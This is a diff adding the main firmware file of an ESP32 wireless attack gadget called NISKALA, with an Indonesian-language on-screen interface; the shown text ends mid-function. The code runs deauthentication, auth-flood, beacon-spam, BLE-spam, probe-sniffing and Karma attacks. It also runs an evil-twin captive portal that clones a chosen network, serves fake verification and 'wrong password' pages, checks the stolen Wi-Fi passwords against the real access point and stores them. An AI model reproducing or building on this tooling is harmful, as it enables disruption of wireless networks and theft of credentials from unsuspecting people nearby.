@@ -1,0 +1,1673 @@
+#include <Arduino.h>
+#include <WiFi.h>
+#include <TFT_eSPI.h>
+#include <esp_wifi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include <Preferences.h>
+
+#include "disclaimer.h"
+#include "attack_engine.h"
+#include "karma.h"
+#include "templates.h"
+#include "bt_spam.h"
+
+TFT_eSPI tft = TFT_eSPI();
+Preferences prefs;
+
+#define BTN_TOP 0
+#define BTN_BOTTOM 35
+
+const int MAX_VERIFY_ATTEMPTS = 5;
+const unsigned long VERIFY_TIMEOUT_MS = 6000;
+const unsigned long RELEASE_DELAY_MS = 2000;
+const unsigned long SUCCESS_HOLD_MS = 4000;
+
+enum State {
+  MAIN_MENU,
+  AP_LIST_DEAUTH,
+  AP_LIST_EVIL_TWIN,
+  AP_LIST_AUTH_FLOOD,
+  TEMPLATE_SELECT,
+  DEAUTH_MENU,
+  AUTH_FLOOD_RUNNING,
+  EVIL_TWIN_RUNNING,
+  BEACON_SPAM,
+  PROBE_SNIFF,
+  GLOBAL_DEAUTH,
+  BT_SPAM,
+  VIEW_PASSWORDS,
+  KARMA_SCAN,
+  KARMA_RESULTS
+};
+State currentState = MAIN_MENU;
+
+int menuSelection = 0;
+int menuScrollPos = 0;
+const int MENU_COUNT = 9;
+const char* menuItems[] = {
+  "DEAUTH MANUAL",
+  "EVIL TWIN",
+  "BEACON SPAM",
+  "PROBE SNIFF",
+  "GLOBAL DEAUTH",
+  "AUTH FLOOD",
+  "BLUETOOTH SPAM",
+  "PASSWORD",
+  "KARMA ATTACK"
+};
+
+volatile AttackMode g_attackMode = ATK_IDLE;
+volatile uint32_t g_packetsSent = 0;
+volatile uint32_t g_txErrors = 0;
+volatile bool g_victimFound = false;
+uint8_t g_victimMAC[6] = {0};
+uint8_t g_targetBSSID[6] = {0};
+volatile uint8_t g_targetChannel = 1;
+
+unsigned long evilTwinStartTime = 0;
+
+ProbeEntry g_probeLog[PROBE_LOG_SIZE];
+volatile int g_probeLogHead = 0;
+volatile int g_probeLogCount = 0;
+
+// Karma data
+KarmaSSIDEntry g_karmaSSIDs[KARMA_MAX_SSIDS];
+int g_karmaSSIDCount = 0;
+KarmaClientEntry g_karmaClients[KARMA_MAX_CLIENTS];
+int g_karmaClientCount = 0;
+volatile uint32_t g_karmaResponses = 0;
+volatile bool g_karmaActiveMode = true;
+
+// Karma UI state
+bool isKarmaRunning = false;
+unsigned long karmaScanStart = 0;
+int karmaSelection = 0;
+int karmaScrollPos = 0;
+
+bool isDeauthRunning = false;
+bool isEvilTwinRunning = false;
+bool isBeaconRunning = false;
+bool isProbeRunning = false;
+bool isGlobalDeauthRunning = false;
+bool isAuthFloodRunning = false;
+bool isBTSpamRunning = false;
+String targetSSID = "";
+int apCount = 0;
+int selectedIdx = 0;
+int apScrollPos = 0;
+
+int selectedTemplateIdx = 0;
+int templateSelection = 0;
+
+int viewSelection = 0;
+int viewScrollPos = 0;
+bool confirmDeleteAll = false;
+unsigned long lastDeletePress = 0;
+const int MAX_SAVED_PWDS = 50;
+
+DNSServer dnsServer;
+WebServer server(80);
+String capturedEmail = "";
+String capturedPass = "";
+bool isReleasing = false;
+bool isVerifying = false;
+bool verificationResult = false;
+unsigned long releaseTimer = 0;
+unsigned long verifyStart = 0;
+const byte DNS_PORT = 53;
+
+int verifyState = 0;
+int verifyAttempts = 0;
+unsigned long releaseAfterSuccess = 0;
+
+TaskHandle_t attackTaskHandle = NULL;
+
+// ═══════════════════════════════════════════════
+// HTML halaman status portal
+// ═══════════════════════════════════════════════
+const char HTML_VERIFYING[] PROGMEM = R"raw(
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="refresh" content="10;url=/">
+<title>Memverifikasi</title>
+<style>
+body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
+min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
+.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
+text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
+.spin{border:4px solid #eef2f5;border-top:4px solid #1e88e5;border-radius:50%;
+width:52px;height:52px;animation:sp .9s linear infinite;margin:0 auto 20px}
+@keyframes sp{to{transform:rotate(360deg)}}
+h2{margin:0 0 8px;color:#1e88e5;font-size:20px}p{margin:0;color:#6b7280;font-size:14px}
+</style></head><body><div class="card"><div class="spin"></div><h2>Memverifikasi...</h2>
+<p>Mohon tunggu sebentar</p></div></body></html>
+)raw";
+
+const char HTML_SUCCESS[] PROGMEM = R"raw(
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Terhubung</title>
+<style>
+body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
+min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
+.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
+text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
+.ok{width:64px;height:64px;border-radius:50%;background:#22c55e;color:#fff;font-size:36px;
+display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
+h2{margin:0 0 8px;color:#22c55e;font-size:22px}p{margin:0;color:#6b7280;font-size:14px}
+</style></head><body><div class="card"><div class="ok">&#10003;</div>
+<h2>Terhubung!</h2><p>Anda sekarang online</p></div></body></html>
+)raw";
+
+const char HTML_ERROR[] PROGMEM = R"raw(
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Password Salah</title>
+<style>
+body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
+min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
+.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
+text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
+.err{width:64px;height:64px;border-radius:50%;background:#ef4444;color:#fff;font-size:36px;
+display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
+h2{margin:0 0 8px;color:#ef4444;font-size:22px}p{margin:0 0 22px;color:#6b7280;font-size:14px}
+a{display:inline-block;padding:14px 32px;background:#1e88e5;color:#fff;text-decoration:none;
+border-radius:10px;font-weight:600;font-size:15px}
+</style></head><body><div class="card"><div class="err">&#10005;</div>
+<h2>Password Salah</h2><p>Silakan coba lagi</p><a href="/">Coba Lagi</a></div></body></html>
+)raw";
+
+// ═══════════════════════════════════════════════
+// UI helpers
+// ═══════════════════════════════════════════════
+void drawGlowText(String text, int x, int y, uint16_t mainColor, uint16_t glowColor) {
+  tft.setTextColor(glowColor);
+  tft.drawString(text, x+1, y); tft.drawString(text, x-1, y);
+  tft.drawString(text, x, y+1); tft.drawString(text, x, y-1);
+  tft.setTextColor(mainColor);
+  tft.drawString(text, x, y);
+}
+
+void drawCornerBrackets(int x, int y, int w, int h, uint16_t color) {
+  int len = 5;
+  tft.drawLine(x, y, x+len, y, color); tft.drawLine(x, y, x, y+len, color);
+  tft.drawLine(x+w-len, y, x+w, y, color); tft.drawLine(x+w, y, x+w, y+len, color);
+  tft.drawLine(x, y+h-len, x, y+h, color); tft.drawLine(x, y+h, x+len, y+h, color);
+  tft.drawLine(x+w-len, y+h, x+w, y+h, color); tft.drawLine(x+w, y+h-len, x+w, y+h, color);
+}
+
+void drawMenuIcon(int idx, int x, int y, uint16_t color) {
+  switch(idx) {
+    case 0:
+      tft.fillTriangle(x+5, y, x, y+8, x+5, y+6, color);
+      tft.fillTriangle(x+5, y+6, x+5, y+14, x+10, y+6, color);
+      break;
+    case 1:
+      tft.drawCircle(x+5, y+7, 5, color); tft.drawCircle(x+9, y+7, 5, color);
+      break;
+    case 2:
+      tft.fillCircle(x+5, y+7, 2, color);
+      tft.drawCircle(x+5, y+7, 5, color); tft.drawCircle(x+5, y+7, 8, color);
+      break;
+    case 3:
+      tft.drawCircle(x+6, y+6, 4, color); tft.drawLine(x+9, y+9, x+13, y+13, color);
+      break;
+    case 4:
+      tft.drawCircle(x+7, y+7, 5, color);
+      tft.drawLine(x+7, y+1, x+7, y+13, color);
+      tft.drawLine(x+1, y+7, x+13, y+7, color);
+      break;
+    case 5:
+      tft.fillRect(x+2, y+2, 10, 10, color);
+      tft.drawLine(x+4, y+4, x+10, y+10, TFT_BLACK);
+      break;
+    case 6:
+      tft.drawLine(x+6, y, x+6, y+10, color);
+      tft.drawLine(x+6, y+10, x+2, y+14, color);
+      tft.drawLine(x+6, y+10, x+10, y+14, color);
+      tft.drawCircle(x+6, y+4, 2, color);
+      break;
+    case 7:
+      tft.drawCircle(x+4, y+5, 3, color);
+      tft.drawLine(x+6, y+7, x+10, y+11, color);
+      tft.drawLine(x+10, y+11, x+8, y+13, color);
+      break;
+    case 8:
+      // Karma icon: radar / spider web
+      tft.drawCircle(x+7, y+7, 7, color);
+      tft.drawCircle(x+7, y+7, 4, color);
+      tft.fillCircle(x+7, y+7, 2, color);
+      tft.drawLine(x+7, y, x+7, y+14, color);
+      tft.drawLine(x, y+7, x+14, y+7, color);
+      break;
+  }
+}
+
+void drawHeader(String title, uint16_t bgColor) {
+  tft.fillRect(0, 0, 240, 24, bgColor);
+  tft.setTextDatum(MC_DATUM); tft.setTextFont(2);
+  tft.setTextColor(TFT_WHITE, bgColor);
+  tft.drawString(title, 120, 12);
+  tft.drawFastHLine(0, 24, 240, TFT_DARKGREY);
+  tft.setTextDatum(TL_DATUM);
+}
+
+void drawFooter(String hint) {
+  tft.drawFastHLine(0, 115, 240, TFT_DARKGREY);
+  tft.fillRect(0, 116, 240, 19, TFT_BLACK);
+  tft.setTextDatum(MC_DATUM); tft.setTextFont(1);
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.drawString(hint, 120, 125);
+  tft.setTextDatum(TL_DATUM);
+}
+
+// ═══════════════════════════════════════════════
+// Splash & scan
+// ═══════════════════════════════════════════════
+void drawElegantSplash() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextDatum(MC_DATUM);
+  
+  // Dekorasi Garis Atas
+  tft.drawFastHLine(30, 10, 180, TFT_DARKCYAN);
+  tft.drawFastHLine(60, 12, 120, TFT_DARKCYAN);
+  
+  // Judul Utama NISKALA dengan efek Glow
+  tft.setTextFont(4);
+  drawGlowText("N I S K A L A", 120, 35, TFT_GREEN, TFT_DARKGREEN);
+  
+  // Tagline & Filosofi
+  tft.setTextFont(1); 
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.drawString("To be invisible is not to be absent", 120, 55);
+  
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.drawString("Etika > Skill | Adab > Ilmu", 120, 68);
+  
+  // Dekorasi Garis Bawah
+  tft.drawFastHLine(30, 78, 180, TFT_DARKCYAN);
+  tft.drawFastHLine(60, 80, 120, TFT_DARKCYAN);
+
+  // Progress Bar Loading
+  int barX = 40, barY = 95, barW = 160, barH = 10;
+  tft.drawRect(barX, barY, barW, barH, TFT_WHITE);
+  
+  for (int p = 0; p <= 100; p += 4) {
+    tft.fillRect(barX+1, barY+1, (p*(barW-2))/100, barH-2, TFT_GREEN);
+    
+    // Teks Loading
+    tft.setTextFont(1); 
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.drawString("Booting " + String(p) + "%", 120, 85);
+    delay(15); 
+  }
+  
+  // Status Ready
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.drawString("System Ready", 120, 115);
+  
+  delay(400); 
+  tft.setTextDatum(TL_DATUM);
+}
+
+void drawScanAnimation(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("SCANNING WIFI...", TFT_DARKGREEN);
+  tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(10, 32);
+  tft.print("Mencari jaringan");
+  for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  int cx = 120, cy = 78;
+  for (int i = 0; i < 3; i++) {
+    int r = (frame * 3 + i * 18) % 55;
+    if (r > 3) tft.drawCircle(cx, cy, r, (r < 25) ? TFT_GREEN : TFT_DARKGREEN);
+  }
+  tft.fillCircle(cx, cy, 4, (frame % 6 < 3) ? TFT_GREEN : TFT_YELLOW);
+  drawFooter("TEKAN TOMBOL = BATAL");
+}
+
+// ═══════════════════════════════════════════════
+// Main menu
+// ═══════════════════════════════════════════════
+void drawMainMenu() {
+  tft.fillScreen(TFT_BLACK);
+  String pwdCount = String(prefs.getInt("pwd_count", 0));
+  String uptime = String(millis() / 1000) + "s";
+  tft.fillRect(0, 0, 240, 24, TFT_DARKGREEN);
+  tft.setTextDatum(ML_DATUM); tft.setTextFont(2);
+  tft.setTextColor(TFT_WHITE, TFT_DARKGREEN);
+  tft.drawString("NISKALA", 8, 12);
+  tft.setTextDatum(MR_DATUM); tft.setTextFont(1);
+  tft.setTextColor(TFT_CYAN, TFT_DARKGREEN);
+  tft.drawString("PWD:" + pwdCount + " | " + uptime, 232, 12);
+  tft.drawFastHLine(0, 24, 240, TFT_CYAN);
+  tft.setTextDatum(TL_DATUM);
+
+  tft.setTextFont(2);
+  const int VISIBLE = 4;
+  for (int i = 0; i < VISIBLE; i++) {
+    int idx = menuScrollPos + i;
+    if (idx >= MENU_COUNT) break;
+    int y = 28 + (i * 22);
+    if (idx == menuSelection) {
+      tft.fillRect(0, y, 240, 20, TFT_DARKGREEN);
+      drawCornerBrackets(2, y+1, 236, 18, TFT_GREEN);
+      tft.setTextColor(TFT_GREEN, TFT_DARKGREEN);
+    } else {
+      tft.fillRect(0, y, 240, 20, TFT_BLACK);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    }
+    uint16_t iconColor = (idx == menuSelection) ? TFT_GREEN : TFT_DARKGREY;
+    drawMenuIcon(idx, 8, y + 3, iconColor);
+    tft.setCursor(24, y + 2);
+    tft.print(menuItems[idx]);
+  }
+
+  if (menuScrollPos > 0) tft.fillTriangle(228, 26, 236, 26, 232, 22, TFT_CYAN);
+  if (menuScrollPos + VISIBLE < MENU_COUNT) tft.fillTriangle(228, 112, 236, 112, 232, 116, TFT_CYAN);
+
+  drawFooter("ATAS: Pilih | BAWAH: OK");
+}
+
+// ═══════════════════════════════════════════════
+// AP list
+// ═══════════════════════════════════════════════
+void drawAPList() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("PILIH TARGET AP", TFT_NAVY);
+  tft.setTextFont(2);
+  for (int i = 0; i < 4; i++) {
+    int idx = apScrollPos + i;
+    if (idx > apCount) break;
+    int y = 28 + (i * 22);
+    if (idx == selectedIdx) {
+      tft.fillRect(0, y, 240, 20, TFT_NAVY);
+      drawCornerBrackets(2, y+1, 236, 18, TFT_CYAN);
+      tft.setTextColor(TFT_CYAN, TFT_NAVY);
+    } else {
+      tft.fillRect(0, y, 240, 20, TFT_BLACK);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    }
+    tft.setCursor(10, y + 2);
+    if (idx < apCount) {
+      String ssid = WiFi.SSID(idx);
+      if (ssid.length() > 16) ssid = ssid.substring(0, 16);
+      tft.print(ssid);
+    } else if (idx == apCount) {
+      tft.print("<< KEMBALI");
+    }
+  }
+  drawFooter("ATAS: Scroll | BAWAH: Pilih");
+}
+
+// ═══════════════════════════════════════════════
+// Template select
+// ═══════════════════════════════════════════════
+void drawTemplateSelect() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("PILIH TEMPLATE PORTAL", TFT_DARKCYAN);
+  tft.setTextFont(2);
+  for (int i = 0; i < TEMPLATE_COUNT; i++) {
+    int y = 32 + (i * 24);
+    if (i == templateSelection) {
+      tft.fillRect(0, y, 240, 22, TFT_DARKCYAN);
+      drawCornerBrackets(2, y+1, 236, 20, TFT_CYAN);
+      tft.setTextColor(TFT_CYAN, TFT_DARKCYAN);
+    } else {
+      tft.fillRect(0, y, 240, 22, TFT_BLACK);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    }
+    tft.setCursor(20, y + 3);
+    tft.print(getTemplateName(i));
+  }
+  drawFooter("ATAS: Pilih | BAWAH: OK");
+}
+
+// ═══════════════════════════════════════════════
+// Deauth menu
+// ═══════════════════════════════════════════════
+void drawDeauthMenu() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("DEAUTH MANUAL", TFT_MAROON);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+
+  tft.setCursor(10, 26); tft.print("Target: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
+  tft.println(s);
+
+  tft.setCursor(10, 46); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Status: ");
+  if (isDeauthRunning) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("MENEMBAK"); }
+  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("BERHENTI"); }
+
+  tft.setCursor(10, 66); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);
+
+  tft.setCursor(10, 86); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Error: ");
+  tft.setTextColor(g_txErrors > 0 ? TFT_RED : TFT_DARKGREY, TFT_BLACK);
+  tft.println(g_txErrors);
+
+  drawFooter("BAWAH: Start/Stop | ATAS: Keluar");
+}
+
+void drawAuthFlood(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("AUTH FLOOD", TFT_MAROON);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 26); tft.print("Target: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
+  tft.println(s);
+  tft.setCursor(10, 48); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);
+  tft.setCursor(10, 70); tft.setTextColor(TFT_RED, TFT_BLACK);
+  tft.print("Flooding auth request");
+  for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  int cx = 200, cy = 88;
+  for (int i = 0; i < 3; i++) {
+    int r = (frame * 4 + i * 12) % 28;
+    if (r > 2) tft.drawCircle(cx, cy, r, r < 14 ? TFT_RED : TFT_MAROON);
+  }
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawGlobalDeauth(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("GLOBAL DEAUTH", TFT_RED);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("Mode: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("CHANNEL HOP");
+  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(g_packetsSent);
+  int cx = 120, cy = 88;
+  for (int i = 0; i < 3; i++) {
+    int r = (frame * 4 + i * 15) % 30;
+    if (r > 2) tft.drawCircle(cx, cy, r, r < 15 ? TFT_RED : TFT_MAROON);
+  }
+  tft.fillCircle(cx, cy, 3, TFT_YELLOW);
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawBeaconSpam(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("BEACON SPAM", TFT_PURPLE);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("SSID pool: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(SPAM_COUNT);
+  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Beacon: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println(g_packetsSent);
+  tft.setCursor(10, 74); tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.print("Broadcasting");
+  for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  int cx = 200, cy = 88;
+  for (int i = 0; i < 3; i++) {
+    int r = (frame * 3 + i * 8) % 25;
+    if (r > 2) tft.drawCircle(cx, cy, r, r < 12 ? TFT_PURPLE : TFT_MAGENTA);
+  }
+  tft.fillCircle(cx, cy, 2, TFT_PINK);
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawProbeSniff(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("PROBE SNIFFER", TFT_DARKCYAN);
+  tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(4, 28); tft.print("MAC ADDR          RSSI  SSID");
+  int count = g_probeLogCount, head = g_probeLogHead;
+  int show = (count < 4) ? count : 4;
+  for (int i = 0; i < show; i++) {
+    int idx = (head - show + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(4, 40 + (i * 18));
+    char buf[64];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %4d  %s",
+      g_probeLog[idx].mac[0], g_probeLog[idx].mac[1],
+      g_probeLog[idx].mac[2], g_probeLog[idx].mac[3],
+      g_probeLog[idx].mac[4], g_probeLog[idx].mac[5],
+      g_probeLog[idx].rssi,
+      g_probeLog[idx].ssid[0] ? g_probeLog[idx].ssid : "(hidden)");
+    tft.print(buf);
+  }
+  if (count == 0) {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.setCursor(4, 45); tft.print("Menunggu probe");
+    for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  }
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(4, 108); tft.print("Total: " + String(count));
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawBTSpam(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("BLUETOOTH SPAM", TFT_BLUE);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("Mode: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("APPLE BLE");
+  tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Payload: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("3 rotasi");
+  tft.setCursor(10, 74); tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.print("Broadcasting BLE");
+  for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  int bx = 200, by = 75;
+  tft.drawLine(bx, by, bx, by+20, TFT_BLUE);
+  tft.drawLine(bx, by+10, bx+8, by+5, TFT_BLUE);
+  tft.drawLine(bx+8, by+5, bx+8, by+15, TFT_BLUE);
+  tft.drawLine(bx+8, by+15, bx, by+10, TFT_BLUE);
+  if (frame % 4 < 2) tft.fillCircle(bx+14, by+10, 2, TFT_CYAN);
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawEvilTwinRunning(int frame) {
+  if (isReleasing) {
+    tft.fillScreen(TFT_BLACK);
+    drawHeader("RELEASING VICTIM", TFT_GREEN);
+    tft.setTextFont(2); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.setCursor(10, 30); tft.print("Email: ");
+    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.println(capturedEmail.substring(0, 18));
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.setCursor(10, 50); tft.print("Pass:  ");
+    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.println(capturedPass.substring(0, 18));
+    int secsLeft = 2 - ((millis() - releaseTimer) / 1000);
+    if (secsLeft < 0) secsLeft = 0;
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.setCursor(10, 75);
+    tft.print("Verify: "); tft.print(secsLeft); tft.println(" detik");
+    int barX = 10, barY = 95, barW = 220, barH = 12;
+    tft.drawRect(barX, barY, barW, barH, TFT_WHITE);
+    tft.fillRect(barX+1, barY+1, (secsLeft*(barW-2))/2, barH-2, TFT_GREEN);
+    drawFooter("VERIFIKASI PASSWORD...");
+    return;
+  }
+
+  if (isVerifying) {
+    tft.fillScreen(TFT_BLACK);
+    drawHeader("VERIFIKASI PASSWORD", TFT_ORANGE);
+    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 40); tft.println("Mencoba koneksi ke");
+    tft.setCursor(10, 60); tft.println("AP target asli...");
+    tft.setCursor(10, 82); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.print("Percobaan: "); tft.print(verifyAttempts + 1);
+    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
+    int spinIdx = (millis() / 200) % 4;
+    const char* spin = "|/-\\";
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.setCursor(10, 100);
+    tft.print("Progress: "); tft.print(spin[spinIdx]);
+    drawFooter("MOHON TUNGGU (6s)...");
+    return;
+  }
+
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("EVIL TWIN AKTIF", TFT_MAGENTA);
+  tft.setTextFont(2); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("Clone: ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  String ssid = targetSSID;
+  if (ssid.length() > 14) ssid = ssid.substring(0, 14);
+  tft.println(ssid);
+
+  if (verifyAttempts > 0) {
+    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
+    tft.setCursor(10, 45);
+    tft.print("Percobaan: "); tft.print(verifyAttempts);
+    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
+  }
+
+  int clients = WiFi.softAPgetStationNum();
+
+  if (clients > 0) {
+    int pulse = ((frame % 8) - 4); if (pulse < 0) pulse = -pulse;
+    uint16_t pc = (frame % 8 < 4) ? TFT_GREEN : TFT_DARKGREEN;
+    drawCornerBrackets(4 + pulse, 61 - pulse, 232 - pulse*2, 30 + pulse*2, pc);
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.setCursor(10, 65);
+    tft.print("KORBAN: "); tft.print(clients); tft.println(" HP");
+    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
+    tft.setCursor(10, 85);
+    tft.print("Menunggu password");
+    for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  } else {
+    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
+    tft.setCursor(10, 65); tft.println("Korban: Belum ada");
+
+    if (millis() - evilTwinStartTime < 3000) {
+      tft.setTextColor(TFT_CYAN, TFT_BLACK);
+      tft.setCursor(10, 85);
+      tft.print("Menyiarkan SSID...");
+    } else {
+      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setCursor(10, 85);
+      tft.print("MENEMBAK DEAUTH");
+      for (int i = 0; i < (frame % 4); i++) tft.print(".");
+      const char* spin = "|/-\\";
+      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+      tft.setCursor(10, 100);
+      tft.print("Radar: "); tft.print(spin[frame % 4]);
+    }
+  }
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(180, 30);
+  tft.print("P:" + String((uint32_t)g_packetsSent));
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+void drawViewPasswords() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("PASSWORD TERSIMPAN", TFT_DARKCYAN);
+  int total = prefs.getInt("pwd_count", 0);
+  tft.setTextFont(2);
+  if (total == 0) {
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 40); tft.println("Belum ada data.");
+  } else {
+    for (int i = 0; i < 2; i++) {
+      int idx = viewScrollPos + i;
+      if (idx >= total) break;
+      int y = 28 + (i * 28);
+      if (idx == viewSelection) {
+        tft.fillRect(0, y, 240, 26, TFT_DARKCYAN);
+        drawCornerBrackets(2, y+1, 236, 24, TFT_CYAN);
+        tft.setTextColor(TFT_CYAN, TFT_DARKCYAN);
+      } else {
+        tft.fillRect(0, y, 240, 26, TFT_BLACK);
+        tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      }
+      String entry = prefs.getString(("pwd_" + String(idx)).c_str(), "");
+      int p1 = entry.indexOf('|');
+      String email = entry.substring(0, p1);
+      String rest = entry.substring(p1 + 1);
+      int p2 = rest.indexOf('|');
+      String pass, status = "";
+      if (p2 > 0) {
+        pass = rest.substring(0, p2);
+        String v = rest.substring(p2 + 1);
+        status = (v == "1") ? " OK" : " XX";
+      } else {
+        pass = rest;
+        status = " ?";
+      }
+      tft.setCursor(5, y + 2);
+      tft.print(email.substring(0, 13));
+      tft.setTextColor(TFT_GREEN, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
+      tft.setCursor(195, y + 2);
+      tft.print(status);
+      tft.setCursor(5, y + 14);
+      tft.setTextColor(TFT_YELLOW, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
+      tft.print(pass.substring(0, 15));
+    }
+  }
+  int yDel = 85;
+  if (viewSelection == total) { tft.fillRect(0, yDel, 240, 15, TFT_RED); tft.setTextColor(TFT_WHITE, TFT_RED); }
+  else { tft.fillRect(0, yDel, 240, 15, TFT_BLACK); tft.setTextColor(TFT_RED, TFT_BLACK); }
+  tft.setCursor(10, yDel);
